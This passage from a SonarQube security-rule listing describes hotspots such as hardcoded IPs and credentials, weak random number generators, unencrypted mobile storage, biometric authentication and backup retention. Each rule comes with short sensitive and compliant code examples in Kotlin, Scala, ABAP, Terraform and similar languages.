  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
val ip = "192.168.12.42"
val socket = ServerSocket(ip, 6667)
</pre>
<h2>Compliant Solution</h2>
<pre>
val ip = System.getenv("myapplication.ip")
val socket = ServerSocket(ip, 6667)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
  <li> Addresses from ::ffff:0:127.0.0.1 to ::ffff:0:127.255.255.255 and from ::ffff:127.0.0.1 to ::ffff:127.255.255.255, which are local IPv4-mapped
  IPv6 addresses </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S2245">
              kotlin:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Only use random number generators which are <a
  href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation">recommended by
  OWASP</a> or any other trusted organization. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
val random = Random() // Noncompliant: Random() is not a secure random number generaotr
val bytes = ByteArray(20)
random.nextBytes(bytes)
</pre>
<h2>Compliant Solution</h2>
<pre>
val random = SecureRandom() // Compliant
val bytes = ByteArray(20)
random.nextBytes(bytes)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/338">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/330">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/326">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/1241">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6291">
              kotlin:S6291
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among
other things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By
default these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive
data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text
storage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>
<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and
decrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases
can rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application
or it can be fetched from a remote server if the other methods are not feasible.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase">SQLiteDatabase</a>:</p>
<pre>
var db = activity.openOrCreateDatabase("test.db", Context.MODE_PRIVATE, null) // Sensitive
</pre>
<p>For <a href="https://developer.android.com/training/data-storage/shared-preferences">SharedPreferences</a>:</p>
<pre>
val pref = activity.getPreferences(Context.MODE_PRIVATE) // Sensitive
</pre>
<p>For <a href="https://docs.mongodb.com/realm/">Realm</a>:</p>
<pre>
val config = RealmConfiguration.Builder().build()
val realm = Realm.getInstance(config) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Instead of SQLiteDatabase you can use <a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/">SQLCipher</a>:</p>
<pre>
val db = SQLiteDatabase.openOrCreateDatabase("test.db", getKey(), null)
</pre>
<p>Instead of SharedPreferences you can use <a
href="https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences">EncryptedSharedPreferences</a>:</p>
<pre>
val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
EncryptedSharedPreferences.create(
    "secret",
    masterKeyAlias,
    context,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
</pre>
<p>For Realm an encryption key can be specified in the config:</p>
<pre>
val config = RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build()
val realm = Realm.getInstance(config)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/311">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6293">
              kotlin:S6293
            </a>
          </td>
          <td>
            <details>
              <p>Android comes with Android KeyStore, a secure container for storing key materials. It’s possible to define certain keys to be unlocked when users
authenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of
the authorized user is required.</p>
<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been
tampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application
process and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform
the critical operations protected by the biometric authentication.</p>
<h2>Ask Yourself Whether</h2>
<p>The application contains:</p>
<ul>
  <li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>
<h2>Sensitive Code Example</h2>
<p>A <code>CryptoObject</code>is not used during authentication:</p>
<pre>
// ...
val biometricPrompt: BiometricPrompt = BiometricPrompt(activity, executor, callback)
// ...
biometricPrompt.authenticate(promptInfo) // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<p>A <code>CryptoObject</code> is used during authentication:</p>
<pre>
// ...
val biometricPrompt: BiometricPrompt = BiometricPrompt(activity, executor, callback)
// ...
biometricPrompt.authenticate(promptInfo, BiometricPrompt.CryptoObject(cipher)) // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://developer.android.com/training/sign-in/biometric-auth">developer.android.com</a> - Use a cryptographic solution that depends
  on authentication </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication">OWASP Mobile Top 10 Category M4</a> - Insecure
  Authentication </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x09-v4-authentication_and_session_management_requirements">OWASP
  MASVS</a> - Authentication and Session Management Requirements </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/287">MITRE, CWE-287</a> - Improper Authentication </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6364">
              cloudformation:S6364
            </a>
          </td>
          <td>
            <details>
              <p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>
<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>
<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require this component to be backed up for a specific amount of time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/rds/">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  relationaldatabase:
    Type: 'AWS::RDS::DBInstance'
    Properties:
      DBName: NonCompliantDatabase
      BackupRetentionPeriod: 2 # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/rds/">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  relationaldatabase:
    Type: 'AWS::RDS::DBInstance'
    Properties:
      DBName: CompliantDatabase
      BackupRetentionPeriod: 5
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S4507">
              flex:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<pre>
if (unexpectedCondition)
{
  Alert.show("Unexpected Condition"); // Sensitive
}
</pre>
<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player:</p>
<pre>
var val:Number = doCalculation();
trace("Calculation result: " + val);  // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/215">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=scala:S1313">
              scala:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
val ip = "192.168.12.42" // Sensitive
val socket = new Socket(ip, 6667)
</pre>
<h2>Compliant Solution</h2>
<pre>
val ips = Source.fromFile(configuration_file).getLines.toList // Compliant
val socket = new Socket(ips(0), 6667)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=scala:S2068">
              scala:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1492">
              abap:S1492
            </a>
          </td>
          <td>
            <details>
              <p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a
<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The whole table is not required. </li>
  <li> The table contains sensitive information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Add a "WHERE" condition to "SELECT" statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT * FROM db_persons INTO us_persons.
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM db_persons INTO us_persons WHERE country IS 'US'.
</pre>
<h2>Exceptions</h2>
<p><code>SELECT SINGLE</code> and <code>UP TO 1 ROWS</code> result in only one record being read, so such <code>SELECT</code>s are ignored by this
rule.</p>
<pre>
SELECT SINGLE * FROM db_persons INTO us_persons.

SELECT * FROM db_persons UP TO 1 ROWS INTO us_persons.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1313">
              abap:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
DATA: ip TYPE string VALUE '192.168.12.42'.
</pre>
<h2>Compliant Solution</h2>
<pre>
READ DATASET file INTO ip MAXIMUM LENGTH len.
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6364">
              terraform:S6364
            </a>
          </td>
          <td>
            <details>
              <p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>
<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>
<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require this component to be backed up for a specific amount of time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/rds/">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
resource "aws_db_instance" "example" {
  backup_retention_period = 2 # Sensitive
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/introduction">Azure Cosmos DB</a> accounts:</p>
<pre>
resource "azurerm_cosmosdb_account" "example" {
  backup {
    type = "Periodic"
    retention_in_hours = 8 # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/rds/">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
resource "aws_db_instance" "example" {
  backup_retention_period = 5
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/introduction">Azure Cosmos DB</a> accounts:</p>
<pre>
resource "azurerm_cosmosdb_account" "example" {
  backup {
    type = "Periodic"
    retention_in_hours = 300
  }
}
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S2068">
              xml:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://docs.spring.io/spring-social-twitter/docs/1.1.0.RELEASE/reference/htmlsingle/">Spring-social-twitter</a> secrets can be stored
inside a xml file:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="
        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;

    &lt;bean id="connectionFactoryLocator" class="org.springframework.social.connect.support.ConnectionFactoryRegistry"&gt;
      &lt;property name="connectionFactories"&gt;
          &lt;list&gt;
              &lt;bean class="org.springframework.social.twitter.connect.TwitterConnectionFactory"&gt;
                  &lt;constructor-arg value="username" /&gt;
                  &lt;constructor-arg value="very-secret-password" /&gt;   &lt;!-- Sensitive --&gt;
              &lt;/bean&gt;
          &lt;/list&gt;
      &lt;/property&gt;
  &lt;/bean&gt;
&lt;/beans&gt;
</pre>
<h2>Compliant Solution</h2>
